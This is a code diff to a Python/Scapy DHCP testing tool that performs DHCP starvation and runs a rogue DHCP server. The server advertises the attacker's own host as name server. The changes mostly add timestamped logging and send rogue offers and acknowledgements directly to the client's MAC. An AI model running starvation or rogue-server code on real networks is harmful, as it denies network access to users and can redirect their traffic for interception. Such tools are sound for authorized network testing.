@@ -3,11 +3,13 @@ from argparse import ArgumentParser
 from scapy.all import sniff,sendp,Ether,get_if_hwaddr,IP,UDP,BOOTP,DHCP,RandString,RandInt
 from threading import Thread, Event
 from time import sleep
+from datetime import datetime
+from ipaddress import IPv4Address
 import curses
 import os
-from ipaddress import IPv4Address
 import socket, struct
 import re
+import subprocess
 
 class DhcpStarve:
     def __init__(self):
@@ -29,21 +31,20 @@ class DhcpStarve:
     def handle_dhcp(self, pkt):
         '''Reacts to dhcp response.'''
         if pkt[DHCP]:
-            print('')
+            timestamp='\n{} '.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
             if pkt[DHCP].options[0][1]==5:                 #5 is DHCPACK
                 self.starvedIPs.append(pkt[IP].dst)
-                print(str(pkt[IP].dst)+" succesfully registered")
+                print("{} ######{} registered (GOT ACK):######\n{}".format(timestamp,pkt[IP].dst,pkt[DHCP].options))
             elif pkt[DHCP].options[0][1]==6:               #6 is DHCPNAK
-                print("DHCP NAK: ", end="")
-                print(pkt[DHCP].options[2][1].decode())    #error msg
+                print("{} ######DHCP NAK:###### \n{}".format(timestamp,pkt[DHCP].options))
             elif pkt[DHCP].options[0][1]==2:               #2 is DHCPOFFER
-                print("DHCP OFFER: \n{}".format(pkt[DHCP].options))
+                print("{} ######DHCP OFFER:###### \n{}".format(timestamp,pkt[DHCP].options))
             elif pkt[DHCP].options[0][1]==3:               #3 is DHCPREQUEST
-                print("DHCP REQUEST: \n{}".format(pkt[DHCP].options))
+                print("{} ######DHCP REQUEST:###### \n{}".format(timestamp,pkt[DHCP].options))
             elif pkt[DHCP].options[0][1]==1:               #1 is DHCPDISCOVER
-                print("DHCP DISCOVER: \n{}".format(pkt[DHCP].options))
+                print("{} ######DHCP DISCOVER:###### \n{}".format(timestamp,pkt[DHCP].options))
             else:
-                print ("DHCP with options: {}".format(pkt[DHCP].options))
+                print ("{} DHCP with options: {}".format(timestamp,pkt[DHCP].options))
             
         else: return False
 
@@ -68,8 +69,8 @@ class DhcpStarve:
         dhcpDiscover/= UDP(dport=67, sport=68)
         dhcpDiscover/= BOOTP(chaddr=LOCALMACRAW,xid=RandInt())
         dhcpDiscover/= DHCP(options=[('message-type', 'discover'), 'end'])
-        # start listening and send packet
-        sendp(dhcpDiscover,iface=LOCALIFACE)  
+       
+        sendp(dhcpDiscover,iface=LOCALIFACE)
         
     @_sniff_wrapper
     def starve(self,startIP,limit):
@@ -86,7 +87,7 @@ class DhcpStarve:
             dhcpResp = sendp(dhcpRequest,iface=LOCALIFACE)
             print('Requesting for IP: {}'.format(requestedIP))
             sleep(0.5)
-        print('Succesfully starved IPs: {}'.format(self.starvedIPs))
+        print('\nRegistered IPs during this session: {}'.format(self.starvedIPs))
         
     def spoofing(self,startPoolIP):
         '''Starts fake DHCP server'''
@@ -96,10 +97,18 @@ class DhcpStarve:
         def spoof_handle_dhcp(pkt):
             '''Reacts to dhcp packet from spoof_listen() method '''
             if pkt[DHCP].options[0][1]==1: #if DHCP DISCOVER
-                print("Received DISCOVER, Sending OFFER")
+                print('\n{} '.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),end='')
+                print(" ######Received DISCOVER:######")
+                print(pkt[DHCP].options)
+                print('\n{} '.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),end='')
+                print(" ######Sending OFFER:######")
                 self.offer(LOCALIP,self.poolIP,'255.255.255.0',pkt)
             elif pkt[DHCP].options[0][1]== 3: #if DHCP REQUEST
-                print("Received REQUEST, Sending ACK")
+                print('\n{} '.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),end='')
+                print(" ######Received REQUEST:######")
+                print(pkt[DHCP].options)
+                print('\n{} '.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),end='')
+                print(" ######Sending ACK:######")
                 self.dhcpack(LOCALIP,self.poolIP,'255.255.255.0',pkt)
                 self.poolIP = next(IPpoolGenerator)  #change to next client IP if one is registered
                             
@@ -118,7 +127,7 @@ class DhcpStarve:
         
     def offer(self,srcIP,client_ip,mask,discoverPkt):
         '''Generate DHCP offer packet'''
-        dhcpOffer = Ether(src=LOCALMAC, dst='ff:ff:ff:ff:ff:ff')
+        dhcpOffer = Ether(src=LOCALMAC, dst=discoverPkt[Ether].src)
         dhcpOffer/= IP(src=srcIP, dst='255.255.255.255')
         dhcpOffer/= UDP(dport=68, sport=67)
         dhcpOffer/= BOOTP(op=2,
@@ -138,10 +147,11 @@ class DhcpStarve:
                                    ('name_server',srcIP),
                                     "end"])
         dhcpResp = sendp(dhcpOffer,iface=LOCALIFACE)
+        print(dhcpOffer[DHCP].options)
         
     def dhcpack(self,srcIP,client_ip,mask,requestPkt):
         '''Generate DHCP request packet'''
-        dhcpack = Ether(src=LOCALMAC, dst='ff:ff:ff:ff:ff:ff')
+        dhcpack = Ether(src=LOCALMAC, dst=requestPkt[Ether].src)
         dhcpack/= IP(src=srcIP, dst='255.255.255.255')
         dhcpack/= UDP(dport=68, sport=67)
         dhcpack/= BOOTP(op=2,
@@ -161,6 +171,7 @@ class DhcpStarve:
                                  ('name_server',srcIP),
                                   "end"])
         dhcpResp = sendp(dhcpack,iface=LOCALIFACE)
+        print(dhcpack[DHCP].options)
         
     @_sniff_wrapper                            
     def sniffing(self):
@@ -186,7 +197,7 @@ class Menu:
         self.title = "Testing tool based on Scapy"
         self.menuItemsHint = "Choose an option or press q to quit:"
         self.menuItems = menuItems
-        self.subtitle = "v1.0 , Jarek J"
+        self.subtitle = "v0.9 , github.com/jarekj9/scapy_dhcp_tester"
         curses.wrapper(self.draw_menu)
         
     def draw_menu(self,stdscr):
@@ -231,7 +242,7 @@ class Menu:
                 self.choose_sniffing()       
                 
             #print big ascii title
-            for y, line in enumerate(ascii_art.splitlines(), 2):
+            for y, line in enumerate(ASCIITITLE.splitlines(), 2):
                 self.stdscr.addstr(y, 2, line)
 
             # print texts
@@ -393,7 +404,7 @@ def configuration():
             exit(1)
     return args
  
-ascii_art= \
+ASCIITITLE= \
 """
     ___        ___   ___     
    /   \/\  /\/ __\ / _ \    
